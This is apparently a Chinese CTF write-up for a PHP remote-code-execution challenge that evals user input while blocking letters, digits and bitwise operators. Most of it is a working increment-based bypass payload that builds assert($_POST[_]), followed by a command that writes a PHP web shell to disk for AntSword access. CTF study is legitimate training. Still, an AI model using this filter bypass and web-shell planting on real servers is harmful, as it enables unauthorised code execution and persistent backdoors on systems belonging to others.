#RCE

```php
<?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);
if (isset($_GET['wllm'])) {
    $wllm = $_GET['wllm'];
    $blacklist = [' ', '\^', '\~', '\|'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $wllm)) {
            die("小伙子只会异或和取反？不好意思哦LTLT说不能用！！");
        }
    }
    if (preg_match('/[a-zA-Z0-9]/is', $wllm)) {
        die("Ra'sAlGhul说用字母数字是没有灵魂的！");
    }
    echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
    eval($wllm);
} else {
    echo "蔡总说：注意审题！！！";
}
```

无字母数字 RCE
而且此题不能 异或，取反，或
可以自增

#### 自增

```url
//测试发现7.0.12以上版本不可使用
//使用时需要url编码下
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
固定格式 构造出来的 assert($_POST[_]);
然后post传入   _=phpinfo();
```

然后利用 file_put_contents() 写入马，蚁剑连接查看

```php
_=file_put_contents("1.php","<?php @eval($_POST['shell']); ?>");
\@
```

参考
[无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）\_无数字正则匹配绕过取反脚本\_yu22x 的博客-CSDN 博客](https://blog.csdn.net/miuzzx/article/details/109143413)

[NSS 日刷-[SWPUCTF 2021 新生赛]hardrce_3-open_basedir 绕过 - Aninock - 博客园 (cnblogs.com)](https://www.cnblogs.com/aninock/p/16461151.html)
